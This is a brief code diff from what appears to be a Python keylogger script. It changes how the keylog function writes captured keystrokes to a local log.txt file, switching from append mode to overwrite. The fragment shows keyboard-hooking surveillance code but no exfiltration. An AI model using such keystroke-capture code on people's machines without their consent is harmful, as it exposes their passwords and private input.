@@ -53,7 +53,7 @@ def keylog():
   kb.hook(on_action)
   kb.wait('esc')
 
-  log_f = open("log.txt", 'a')
+  log_f = open("log.txt", 'w')
   log_f.write(str(keystroke))
   log_f.close()
 
